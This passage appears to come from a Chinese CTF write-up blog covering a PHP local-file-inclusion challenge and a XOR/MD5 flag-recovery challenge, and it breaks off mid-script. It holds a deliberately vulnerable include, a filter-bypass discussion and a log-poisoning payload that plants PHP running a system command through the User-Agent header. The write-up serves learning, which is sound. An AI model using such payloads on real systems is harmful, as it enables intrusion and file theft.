class="comment">// 关闭PHP的错误报告，这意味着PHP代码在执行过程中遇到错误时不会显示详细的错误信息</span></span><br><span class="line"><span class="comment">// 在实际开发中，一般仅在生产环境且已经充分测试确保无问题时才建议这样设置，开发阶段建议开启错误报告以便排查问题</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从POST请求数据中获取名为&#x27;incompetent&#x27;的变量值，并赋值给$incompetent变量</span></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>];</span><br><span class="line"><span class="comment">// 从POST请求数据中获取名为&#x27;Datch&#x27;的变量值，并赋值给$Datch变量</span></span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断$incompetent的值是否不等于&#x27;HelloWorld&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span>!== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果不等于&#x27;HelloWorld&#x27;，则输出提示信息并终止脚本执行</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;写出程序员的第一行问候吧！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个包含特定字符的数组，这里的字符可能与后续要验证的文件名或路径等相关（具体作用需结合更多上下文确定）</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="comment">// 初始化一个变量$is_valid为true，用于后续验证是否满足条件的标记</span></span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历$required_chars数组中的每个字符</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="comment">// 使用strpos函数在$Datch字符串中查找当前字符$char，如果未找到（返回false）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// 则将$is_valid标记设置为false，表示不满足条件</span></span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 并使用break语句跳出当前循环，因为只要有一个字符不满足条件就无需继续检查其他字符了</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果$is_valid为true，即前面的字符验证都通过了</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123;</span><br><span class="line">    <span class="comment">// 定义一个包含多种协议相关字符串的数组，这些协议通常用于文件包含等操作时可能存在安全风险的情况</span></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span>, <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历$invalid_patterns数组中的每个协议字符串</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">        <span class="comment">// 使用stripos函数在不区分大小写的情况下在$Datch字符串中查找当前协议字符串$pattern，如果找到了（返回值不等于false）</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="comment">// 则输出提示信息并终止脚本执行，防止可能的安全风险操作</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;此路不通换条路试试?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果前面的验证都通过了，这里使用include函数包含由$Datch指定的文件（这里假设$Datch是一个文件名或文件路径）</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果$is_valid为false，即前面的字符验证未通过，则输出提示信息并终止脚本执行</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件名不合规 请重试&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个参数不再多说</p><p>第二个参数，进行了两次认证，一次是 strpos(** **查找字符串首次出现的位置，不区分大小写)，一次是 stripos(查找字符串首次出现的位置，区分大小写)</p><p>拓展：</p><p>strpos()函数可以用数组绕过和%0a(换行)绕过。返回值为 false，刚好可以绕过第一个认证</p><p>但是这里有两个认证，这种方法不行。</p><p>看见请求头 sever 参数</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731488907046-7eaab307-7f7d-4a0b-bf11-6fb08f93b08b.png" referrerpolicy="no-referrer"></p><p>使用日志包含</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731489183836-5bba8b4b-8b8e-4910-8c43-91e8f1d3a968.png" referrerpolicy="no-referrer"></p><p>之后发现回显都是 ua 头里的内容，在 ua 头里加入 <?php eval(system('cat /flag'))?></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731491587205-6fba3597-3c35-43e0-8d2c-9aaae96eb93c.png" referrerpolicy="no-referrer"></p><p>得到 flag</p><h2 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h2><h3 id="考点：-14"><a href="#考点：-14" class="headerlink" title="考点："></a>考点：</h3><p>1.异或运算符（^）</p><p>0 ^ 0 &#x3D; 0</p><p>0 ^ 1 &#x3D; 1</p><p>1 ^ 0 &#x3D; 1</p><p>1 ^ 1 &#x3D; 0</p><p>正常的整数不止有 0 和 1 怎么办，那就是对二进制后的各位进行异或运算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">3</span>; <span class="comment">// 二进制为011</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">5</span>; <span class="comment">// 二进制为101</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> ^ <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><blockquote><p>结果为 6 &#x2F;&#x2F;二进制为 110（正是各位二进制之后的结果）</p></blockquote><p>应用：</p><p>使用异或运算可以用来交换两个参数的值（不需要使用中间变量），以下以 php 语言演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;	<span class="comment">//a=3(011)	b=5(101)</span></span><br><span class="line">       <span class="variable">$a</span> = <span class="variable">$a</span> ^ <span class="variable">$b</span>;	<span class="comment">//异或之后，a变为110</span></span><br><span class="line">       <span class="variable">$b</span> = <span class="variable">$a</span> ^ <span class="variable">$b</span>;  <span class="comment">//a(110)和b(101)，运算之后，b（011）也就是原来a的值</span></span><br><span class="line">       <span class="variable">$a</span> = <span class="variable">$a</span> ^ <span class="variable">$b</span>;	<span class="comment">//a(110)和b(011)，运算之后，a（101）也就是原来b的值</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;a=&#x27;</span>.<span class="variable">$a</span>.PHP_EOL.<span class="string">&#x27;b=&#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="title function_ invoke__">swap</span>(<span class="number">3</span>,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果：</span></span><br><span class="line">a=<span class="number">5</span></span><br><span class="line">b=<span class="number">3</span></span><br></pre></td></tr></table></figure><p>总结：</p><p>一数和二数进行进行异或运算得到的值。一数与整个值进行异或运算将得到二数的值，二数与这个值进行异或运算将得到一数的值。</p><p>2.ord()函数</p><p>获取该字符的 ascii 值</p><h3 id="题解：-14"><a href="#题解：-14" class="headerlink" title="题解："></a>题解：</h3><p>进入题目，发现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 开启语法高亮显示当前文件的代码，方便在出现错误等情况时查看代码结构</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 关闭PHP的错误报告，这样在代码执行过程中遇到错误时不会显示详细的错误信息到页面上</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入名为flag.php的文件，通常这里面可能包含了要获取的目标 flag 信息等</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查通过POST方法提交的名为&#x27;len&#x27;的数据的元素个数是否与变量$array的元素个数相等</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;len&#x27;</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果相等，调用ys_open函数并传入通过GET方法获取的名为&#x27;tip&#x27;的值作为参数</span></span><br><span class="line">    <span class="title function_ invoke__">ys_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tip&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果不相等，输出错误信息并终止脚本执行，表示输入不符合要求就不能继续进行后续操作</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义名为ys_open的函数，接受一个参数$tip</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在函数内部，检查传入的参数$tip的值是否不等于 &quot;我要玩原神&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$tip</span>!= <span class="string">&quot;我要玩原神&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果不等于，输出错误信息并终止函数执行，表示必须传入特定的值才能继续</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果$tip的值等于 &quot;我要玩原神&quot;，则调用dumpFlag函数</span></span><br><span class="line">    <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义名为dumpFlag的函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dumpFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 检查通过POST方法提交的名为&#x27;m&#x27;的数据是否未设置，或者其元素个数不等于2</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>])!= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果满足上述条件之一，输出错误信息并终止函数执行，表示提交的数据不符合要求</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;可恶的QQ人！😡😡😡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取通过POST方法提交的名为&#x27;m&#x27;的数据中的第一个元素，赋值给变量$a</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 获取通过POST方法提交的名为&#x27;m&#x27;的数据中的第二个元素，赋值给变量$b</span></span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查变量$a是否为空，或者变量$b是否为空，或者变量$a的值不等于 &quot;100%&quot;，或者变量$b的值不等于 &quot;love100%&quot; 拼接上变量$a的MD5值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span>!= <span class="string">&quot;100%&quot;</span> || <span class="variable">$b</span>!= <span class="string">&quot;love100%&quot;</span>. <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">        <span class="comment">// 如果满足上述条件之一，输出错误信息并终止函数执行，表示提交的数据不符合特定格式要求</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次引入flag.php文件，这里可能是为了确保能获取到最新的flag相关信息（虽然前面已经引入过，但在函数内部再次引入可能有其特定需求）</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个空数组$flag</span></span><br><span class="line">    <span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过循环，根据变量$array的元素个数进行迭代</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>; <span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>); <span class="variable">$ii</span>++) &#123;</span><br><span class="line">        <span class="comment">// 对$array中的每个元素，先获取其ASCII码值，然后与循环变量$ii进行异或运算，最后对结果进行MD5加密，并将加密结果存入$flag数组对应位置</span></span><br><span class="line">        <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将$flag数组转换为JSON格式的字符串并输出到页面上</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>$len （$_POST）的长度等于 $array的长度</li><li>$tip（$_GET）&#x3D; ‘我要玩原神’</li><li>$m（$_POST）长度为 2，且第一个元素等于字符串‘100%’，第二个元素等于字符串‘love100%’拼接‘100%’的 md5 值</li></ul><p>首先，第一步要判断输入长度合适的 len 数组，使用脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://gz.imxbt.cn:20279/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    payload = &#123;<span class="string">f&#x27;len[<span class="subst">&#123;j&#125;</span>]&#x27;</span>: <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i)&#125;</span><br><span class="line">    resp = requests.post(url, data=payload)</span><br><span class="line">    last_line = resp.text.splitlines()[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(last_line)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;我不管，我要玩原神！😭😭😭&#x27;</span> <span class="keyword">in</span> last_line:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;长度是<span class="subst">&#123;i&#125;</span>\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&amp;&#x27;</span>.join(<span class="string">f&#x27;len[<span class="subst">&#123;m&#125;</span>]=1&#x27;</span> <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(i)))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>结果是 i&#x3D;44,即 len 数组长度为 45</p></blockquote><p>第二步</p><blockquote><p>&#x2F;?tip &#x3D; 我要玩原神</p></blockquote><p>第三步</p><blockquote><p>m[0]&#x3D;100%&amp;m[1]&#x3D;love100%30bd7ce7de206924302499f197c7a966</p></blockquote><p>得到 json 数据</p><blockquote><p>[“3295c76acbf4caaed33c36b1b5fc2cb1”,”26657d5ff9020d2abefe558796b99584”,”73278a4a86960eeb576a8fd4c9ec6997”,”ec8956637a99787bd197eacd77acce5e”,”e2c420d928d4bf8ce0ff2ec19b371514”,”43ec517d68b6edd3015b3edc9a11367b”,”ea5d2f1c4608232e07d3aa3d998e5135”,”c8ffe9a587b126f152ed3d89a146b445”,”642e92efb79421734881b53e1e1b18b6”,”2723d092b63885e0d7c260cc007e8b9d”,”a3c65c2974270fd093ee8a9bf8ae7d0b”,”65b9eea6e1cc6bb9f0cd2a47751a186f”,”66f041e16a60928b05a7e228a89c3799”,”a3c65c2974270fd093ee8a9bf8ae7d0b”,”b53b3a3d6ab90ce0268229151c9bde11”,”65b9eea6e1cc6bb9f0cd2a47751a186f”,”7f39f8317fbdb1988ef4c628eba02591”,”3416a75f4cea9109507cacd8e2f2aefc”,”7f6ffaa6bb0b408017b62254211691b5”,”1c383cd30b7c298ab50293adfecb7b18”,”182be0c5cdcd5072bb1864cdee4d3d6e”,”9f61408e3afb633e50cdf1b20de6f466”,”e369853df766fa44e1ed0ff613f563bd”,”d67d8ab4f4c10bf22aa353e27879133c”,”d9d4f495e875a2e075a1a4a6e1b9770f”,”d645920e395fedad7bbbed0eca3fe2e0”,”b53b3a3d6ab90ce0268229151c9bde11”,”a0a080f42e6f13b3a2df133f073095dd”,”ec5decca5ed3d6b8079e2e7e7bacc9f2”,”3416a75f4cea9109507cacd8e2f2aefc”,”17e62166fc8586dfa4d1bc0e1742c08b”,”c0c7c76d30bd3dcaefc96f40275bdc0a”,”735b90b4568125ed6c3f678819b6e058”,”70efdf2ec9b086079795c442636b55fb”,”3c59dc048e8850243be8079a5c74d079”,”14bfa6bb14875e45bba028a21ed38046”,”7cbbc409ec990f19c78c75bd1e06f215”,”1f0e3dad99908345f7439f8ffabdffc4”,”34173cb38f07f89ddbebc2ac9128303f”,”6f4922f45568161a8cdf4ad2299f6d23”,”c16a5320fa475530d9583c34fd356ef5”,”28dd2c7955ce926456240b2ff0100bde”,”6f4922f45568161a8cdf4ad2299f6d23”,”1f0e3dad99908345f7439f8ffabdffc4”,”43ec517d68b6edd3015b3edc9a11367b”]</p></blockquote><p>编写脚本破译</p><p>方法 1</p><blockquote><p>就是正常的遍历</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5_flag = [<span class="string">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class="string">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>, <span class="string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>, <span class="string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>, <span class="string">&quot;642e92efb79421734881b53e1e1b18b6&quot;</span>,</span><br><span class="line">            <span class="string">&quot;2723d092b63885e0d7c260cc007e8b9d&quot;</span>, <span class="string">&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;</span>, <span class="string">&quot;65b9eea6e1cc6bb9f0cd2a47751a186f&quot;</span>,</span><br><span class="line">            <span class="string">&quot;66f041e16a60928b05a7e228a89c3799&quot;</span>, <span class="string">&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;</span>, <span class="string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>,</span><br><span class="line">            <span class="string">&quot;65b9eea6e1cc6bb9f0cd2a47751a186f&quot;</span>, <span class="string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span class="string">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;7f6ffaa6bb0b408017b62254211691b5&quot;</span>, <span class="string">&quot;1c383cd30b7c298ab50293adfecb7b18&quot;</span>, <span class="string">&quot;182be0c5cdcd5072bb1864cdee4d3d6e&quot;</span>,</span><br><span class="line">            <span class="string">&quot;9f61408e3afb633e50cdf1b20de6f466&quot;</span>, <span class="string">&quot;e369853df766fa44e1ed0ff613f563bd&quot;</span>, <span class="string">&quot;d67d8ab4f4c10bf22aa353e27879133c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;d9d4f495e875a2e075a1a4a6e1b9770f&quot;</span>, <span class="string">&quot;d645920e395fedad7bbbed0eca3fe2e0&quot;</span>, <span class="string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>,</span><br><span class="line">            <span class="string">&quot;a0a080f42e6f13b3a2df133f073095dd&quot;</span>, <span class="string">&quot;ec5decca5ed3d6b8079e2e7e7bacc9f2&quot;</span>, <span class="string">&quot;3416a75f4cea9109507cacd8e2f2aefc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;17e62166fc8586dfa4d1bc0e1742c08b&quot;</span>, <span class="string">&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;</span>, <span class="string">&quot;735b90b4568125ed6c3f678819b6e058&quot;</span>,</span><br><span class="line">            <span class="string">&quot;70efdf2ec9b086079795c442636b55fb&quot;</span>, <span class="string">&quot;3c59dc048e8850243be8079a5c74d079&quot;</span>, <span class="string">&quot;14bfa6bb14875e45bba028a21ed38046&quot;</span>,</span><br><span class="line">            <span class="string">&quot;7cbbc409ec990f19c78c75bd1e06f215&quot;</span>, <span class="string">&quot;1f0e3dad99908345f7439f8ffabdffc4&quot;</span>, <span class="string">&quot;34173cb38f07f89ddbebc2ac9128303f&quot;</span>,</span><br><span class="line">            <span class="string">&quot;6f4922f45568161a8cdf4ad2299f6d23&quot;</span>, <span class="string">&quot;c16a5320fa475530d9583c34fd356ef5&quot;</span>, <span class="string">&quot;28dd2c7955ce926456240b2ff0100bde&quot;</span>,</span><br><span class="line">            <span class="string">&quot;6f4922f45568161a8cdf4ad2299f6d23&quot;</span>, <span class="string">&quot;1f0e3dad99908345f7439f8ffabdffc4&quot;</span>, <span class="string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(<span class="built_in">str</span>(i ^ j).encode()).hexdigest() == md5_flag[i]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>方法 2</p><blockquote><p>利用了上述讲的结论，先遍历出这个 MD5 加密前的数字</p><p>然后用数组序号与其异或运算就得到了该位置字符的 ascii 值</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">md5_flag = [<span class="string">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class="string">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>, <span class="string">&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ec8956637a99787bd197eacd77acce5e&quot;</span>, <span class="string">&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;</span>, <span class="string">&quot;43ec517d68b6edd3015b3edc9a11367b&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;</span>, <span class="string">&quot;c8ffe9a587b126f152ed3d89a146b445&quot;</span>, <span class="string">&quot;642e92efb79421734881b53e1e1b18b6&quot;</span>,</span><br><span class="line">            <span class="string">&quot;2723d092b63885e0d7c260cc007e8b9d&quot;</span>, <span class="string">&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;</span>, <span class="string">&quot;65b9eea6e1cc6bb9f0cd2a47751a186f&quot;</span>,</span><br><span class="line">            <span class="string">&quot;66f041e16a60928b05a7e228a89c3799&quot;</span>, <span class="string">&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;</span>, <span class="string">&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;</span>,</span><br><span class="line">            <span class="string">&quot;65b9eea6e1cc6bb9f0cd2a47751a186f&quot;</span>, <span class="string">&quot;7f39f8317fbdb1988ef4c628eba02591&quot;</span>, <span 